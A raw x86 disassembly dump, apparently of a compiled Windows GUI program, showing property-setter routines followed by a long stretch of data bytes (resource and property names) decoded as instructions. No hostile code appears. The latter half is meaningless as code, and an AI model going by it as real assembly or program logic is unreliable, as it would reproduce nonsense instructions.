cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_48cb50
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_48c408
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_405830
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_48c3f4
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_48ca58
sub_48cb60
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx edx [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
movzx eax [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
movzx eax [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_405830
test eax eax
je r-xdata
sub_48cbdc
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x6c ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ ebx + 0x6c ] eax
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_405830
test eax eax
je r-xdata
sub_48cc34
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x70 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x70 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x34 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4305a0
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4305a0
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
sub_48cc8c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_407768
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_4070a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4305a0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4305a0
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
sub_48ccf4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_405830
test eax eax
je r-xdata
sub_48cd4c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_407768
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_4070a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_405830
test eax eax
je r-xdata
sub_48cdac
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_405830
test eax eax
je r-xdata
sub_48ce08
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
movzx eax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_405830
test eax eax
je r-xdata
sub_48ce6c
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x86 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
mov [ ebx + 0x86 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_405830
test eax eax
je r-xdata
sub_48cecc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_407768
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_43c9e8
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_48c9f8
sub_48cf18
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_48cf40
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_48c1a4
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
movzx edx [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_48ca58
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_48cfcc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebx + 0x90 ] eax
sub_48d000
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_48d030
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_433550
mov edi eax
mov eax esi
call sub_45b51c
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_48d05c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_48d158
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
aam 0x48
add [ eax - 0x7effb72f ] bh
ror [ eax ] cl
add [ eax ] al
add [ eax ] al
popfd
ror [ eax ] cl
dec esp
add [ eax ] al
add [ eax + 0x5f ] ch
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbcee ] ah
adc eax [ ebx ]
movsb [ edi ] [ esi ]
adc eax [ ebx ]
enter 0x4947 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
add [ eax ] al
mov dl bl
dec eax
add [ eax + eax ] al
add [ eax ] al
or [ esi + 0x43 ] al
outsd
outsb
je r-xdata
test al 0xd0
dec eax
add [ eax ] bl
outsd
insb
add al [ eax ]
add ah ch
ror [ eax ] 0x1
or [ eax ] al
add [ eax ] al
or al [ esi + 0x49 ]
outsb
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
adc [ eax ] al
and al 0x0
add [ eax ] al
or eax [ esi + 0x42 ]
jne r-xdata
imul ebp [ esi + 0x2 ] 0x10000000
inc eax
add [ eax + eax ] bl
add [ eax ] al
or [ esi + 0x56 ] al
imul esi [ ebx + 0x69 ] 0x2656c62
add [ eax ] al
add [ eax ] dl
in al dx
ror [ eax ] 0x1
or al [ eax ]
add [ eax ] al
push cs
inc esi
push eax
popad
dec ecx
outsb
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax ] cl
inc esi
push eax
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
arpl [ ebx + 0x69 ] bp
outsb
add al [ bx + si ]
add [ eax ] al
adc [ eax ] al
push ds
add [ eax ] al
add [ edi ] al
inc esi
push ebx
arpl [ ecx + 0x6c ] sp
add al [ fs : eax ]
add [ eax ] al
adc [ eax ] al
pop ds
add [ eax ] al
add [ edi ] al
inc esi
push ebx
insd
outsd
outsd
je r-xdata
pushfd
adc [ eax ] al
or al 0x0
add [ eax ] al
or [ esi + 0x50 ] eax
outsd
jae r-xdata
add [ eax ] al
jb r-xdata
dec esi
add al [ fs : eax ]
add [ eax ] al
add eax [ eax ]
scasd [ edi ]
ror [ eax ] cl
dec edx
add [ edx ] al
add ch ah
ror [ eax ] cl
inc edx
add ah dh
call [ edi ]
aam 0x48
add [ edx ] al
hlt
popad
inc esp
imul esi [ esi + 0x2 ] 0x109c0000
inc eax
add [ eax ] al
add [ eax ] al
or [ esi + 0x4c ] al
imul ebp [ esi + 0x65 ] 0x2766944
add [ eax ] al
add [ eax ] dl
cmp al 0x0
outsb
push ebx
imul edi [ edx + 0x65 ] 0x58000002
inc esp
add [ eax ] ch
add [ eax ] al
add [ esi ] al
inc esi
add [ eax ] dl
inc eax
add [ eax + eax ] ch
add [ eax ] al
or al 0x46
push eax
popad
jb r-xdata
add [ eax ] al
ror [ eax ] 0x1
xor al 0x0
add al [ eax ]
add [ eax + edx + 0x200040 ] bl
add [ eax ] al
push es
inc esi
inc esp
insb
popad
jns r-xdata
inc eax
add [ 0x9000000 ] bl
je r-xdata
insb
add al [ gs : eax ]
add al [ eax ]
xor al [ eax ]
sbb [ eax + 0x49 ] cl
inc eax
add [ eax + eax ] al
add [ 0x64705546 ] cl
popad
je r-xdata
inc esp
imul esi [ esi + 0x2 ] 0x10000000
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
insb
add al [ gs : eax ]
add [ eax + edx + 0x380040 ] bl
add [ eax ] al
or al [ esi + 0x54 ]
push 0x53626d75
imul edi [ edx + 0x65 ] 0x9c000002
adc [ eax ] al
pushfd
add [ eax ] al
inc esi
push esp
jb r-xdata
sbb eax 0x9000000
add [ eax ] al
add [ 0x6e694b46 ] al
add al [ fs : eax ]
add ah cl
adc [ eax ] al
sbb al [ eax ]
add [ eax ] al
pop es
inc esi
dec ebp
popad
jb r-xdata
outsd
outsb
add al [ eax ]
add [ eax + edx + 0x100040 ] bl
add [ eax ] al
push es
inc esi
push edx
popad
outsb
add al [ gs : bx + si ]
add [ eax + edx + 0x140040 ] bl
add [ eax ] al
or al [ esi + 0x43 ]
popad
insb
arpl [ edx + 0x61 ] dx
outsb
add al [ gs : bx + si ]
add [ eax + 0x180048d0 ] ch
add [ eax ] al
add [ eax + 0x8 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax + edx + 0x240040 ] bl
add bh bh
les ecx [ esi + 0x49 ]
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
or [ esi + 0x50 ] al
add [ eax + eax ] bh
outsd
insb
outsd
jb r-xdata
add [ edx ] dl
dec ecx
jae r-xdata
add [ edx ] dh
add al bl
dec ecx
dec ecx
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
insb
add al [ eax ]
add al [ eax ]
xor al [ eax ]
fmul [ ecx + 0x49 ]
ror [ eax ] 0x1
cwde
pushad
inc edx
add [ 0x6f460500 ] cl
jb r-xdata
dec edi
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_446758
sub [ eax ] al
add bh bh
or [ edi + 0x49 ] cl
add [ ecx ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
push eax
aam 0x48
add [ edi ] al
imul esi [ ebx + 0x69 ] 0x3656c62
add [ eax ] al
add [ eax ] al
push es
inc esi
push ebx
je r-xdata
pushfd
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
add eax 0x7a695346
add al [ gs : eax ]
add [ ecx + edx * 8 ] cl
dec eax
add [ eax + eax ] dh
add [ eax ] al
add [ edx ] dl
inc ebx
push 0x65676e61
inc edx
imul eax [ ecx + ebp * 2 + 0x50 ] 0x7469736f
imul ebp [ edi + 0x6e ] 0x3
add [ eax ] al
or [ eax ] al
add [ eax ] eax
dec esp
aam 0x48
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] bl
dec eax
dec ecx
add al cl
inc edi
dec ecx
add [ esi ] al
inc ecx
jae r-xdata
add [ eax ] al
add [ eax ] al
ror [ eax ] 0x1
or [ eax ] al
add bh bh
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
jmp [ edi + ecx * 2 ]
jae r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] eax
dec esp
aam 0x48
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
imul esp [ edx + 0x6c ] 0x365
imul esp [ edi + 0x6e ] 0x3
add [ eax ] al
or [ eax ] al
add al [ eax ]
dec esp
aam 0x48
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x1004260 ] bl
add [ esi ] al
push ebx
outsd
jne r-xdata
add [ eax ] al
[ 0x1ff0000 ]
pushfd
adc [ eax ] al
xor [ eax ] al
add bh bh
clc
dec edi
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
cmp al 0x50
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
pushfd
adc [ eax ] al
cmp [ eax ] al
add bh bh
push esp
push eax
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
insb
outsd
jb r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ edx ] dh
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xf656c62
add [ edx ] al
sahf
salc
dec eax
add [ edx ] al
add [ edx ] al
mov ebp 0x20048d6
add [ ebx ] al
jne r-xdata
push eax
dec eax
add [ edx ] al
add [ ebx ] al
0x20048d4 0x300
mov edx 0x20048d4
add [ ebx ] al
fcomp st4
dec eax
add [ edx ] al
add [ ebx ] al
call esp
dec eax
add [ edx ] al
add [ ebx ] al
and eax 0x20048d5
add [ ebx ] al
dec eax
aad 0x48
add [ edx ] al
add [ ebx ] al
push 0x20048d5
add [ ebx ] al
mov ebp edx
dec eax
add [ edx ] al
add [ ebx ] al
test al 0xd5
dec eax
add [ edx ] al
add [ ebx ] al
enter 0x48d5 0x0
add al [ eax ]
add ebp esp
aad 0x48
add [ edx ] al
add [ ebx ] al
aam 0x48
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
test al 0x50
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
or [ eax ] al
add bh bh
rol [ edi + 0x49 ] 0x0
adc [ eax ] al
or al 0x0
add bh bh
cmp al 0x4f
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
outsd
outsb
pushfd
adc [ eax ] al
adc [ eax ] al
add bh bh
test [ eax + 0x49 ] dl
add [ eax + 0x4950 ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
sub_48e19e
adc [ eax ] al
pushfd
adc [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] bl
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx ] al
add ah cl
adc [ eax ] al
pop es
inc ebx
outsd
insd
insd
popad
outsb
add al [ fs : eax ]
add [ eax + edx + 0x44040040 ] bl
popad
je r-xdata
add [ eax ] al
add [ eax ] al
inc eax
in al 0x48
add al [ eax ]
add [ eax ] eax
adc [ eax ] al
or [ ebx + 0x61 ] al
insb
insb
dec eax
insb
jo r-xdata
pushfd
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add al 0x46
push esp
outsd
jo r-xdata
add [ eax ] al
inc eax
add al ch
loope r-xdata
add [ ebp - 0x1e17ffc0 ] cl
dec eax
pushfd
adc [ eax ] al
adc al 0x0
add [ eax ] al
push es
inc esi
push edx
imul esp [ edi + 0x68 ] 0x274
pushfd
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
pop es
inc esi
inc edx
outsd
je r-xdata
add [ eax ] al
add [ edx - 0x1cd0ffb8 ] cl
add [ eax ] al
add [ eax ] al
add [ eax - 0x1c ] al
dec eax
add [ ebx ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbcee ] ah
aam 0x58
jo r-xdata
add [ eax ] cl
add [ edx ] al
add [ esp ] bh
outsd
insd
add al [ eax ]
add ah dl
inc esi
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] cl
inc esi
dec edi
outsb
inc ebx
push 0x65676e61
add al [ eax ]
add [ eax ] al
adc [ eax ] al
sub [ eax ] al
add [ eax ] al
or eax 0x65685346
je r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ ebx - 0x1d ] dl
dec eax
add [ eax + eax ] dh
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
loope r-xdata
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ esp ] bh
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al bl
test [ esi ] al
add [ eax ] eax
pop es
inc ebx
outsd
imul esp [ edi + 0x6e ] 0x3
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
cmp al 0xe4
inc di
insb
popad
jae r-xdata
add [ eax ] al
push 0xac00425f
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
xor al 0x0
add [ esi ] al
jo r-xdata
add bh bh
dec eax
daa
dec edx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ebx ] al
outsd
insb
add al [ eax ]
add al [ eax ]
mov eax eax
inc eax
add [ edi ] al
or edx [ edi + eax * 2 + 0x6c ]
popad
jae r-xdata
add [ edx ] al
add [ ebx + 0x48e440c0 ] cl
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ 0x4a25fc00 ] ch
add [ 0x6d617246 ] cl
inc ebp
js r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
cmp al 0xe4
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x1004260 ] bl
add [ esi ] al
push ebx
outsd
jne r-xdata
outsb
add eax [ eax ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
add al 0x0
pop edi
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
cmc
dec eax
push ebp
inc eax
add [ ebp + edx * 2 + 0x12a00040 ] ah
inc ebx
add [ ebx + edx + 0x13a40043 ] bl
dec esi
outsd
outsb
push es
jo r-xdata
insd
adc [ eax ] al
adc al 0x0
add bh bh
dec eax
daa
dec edx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ 0x68676952 ] al
je r-xdata
push esp
outsd
jo r-xdata
inc esi
jb r-xdata
loop r-xdata
outsb
add eax [ fs : eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add [ esp ] bh
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
inc edx
add [ esi ] dh
dec edx
add [ ecx ] dl
dec ecx
outsb
je r-xdata
insb
add al [ eax ]
add [ ebp + esi * 8 + 0x48 ] ah
add [ edx ] al
add [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x2000274
add [ eax + eax - 0xc ] al
call [ ebp + 0x4a0048e3 ]
add [ edx ] al
add bl cl
jecxz r-xdata
adc eax [ ebx ]
movsb [ edi ] [ esi ]
adc eax [ ebx ]
dec eax
mov al [ 0xffffffff9c004312 ]
inc ecx
jne r-xdata
add [ eax ] al
[ eax ]
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
pop es
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add bh bh
sbb [ edi ] ah
outsb
popad
bound ebp [ ebp + 0x64 ]
pushfd
adc [ eax ] al
sbb [ eax ] al
add bh bh
dec eax
daa
dec edx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
push es
inc edx
outsd
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add edx [ edi + ebp * 2 + 0x70 ]
pushfd
insd
jl r-xdata
add [ ecx ] al
add [ esp + ecx * 2 ] al
je r-xdata
jae r-xdata
add [ eax + 0x6004260 ] bl
add [ 0x6d726f46 ] al
daa
jb r-xdata
outsb
je r-xdata
add [ edx ] al
hlt
inc ebx
add [ eax + 0x25 ] cl
dec edx
add [ eax + 0x4a25 ] ah
outsd
or dh [ eax + 0x6d ]
inc ebp
js r-xdata
in al 0x48
adc [ eax ] al
adc [ eax ] al
add [ eax + 0x4f08ffff ] al
outsb
inc ebx
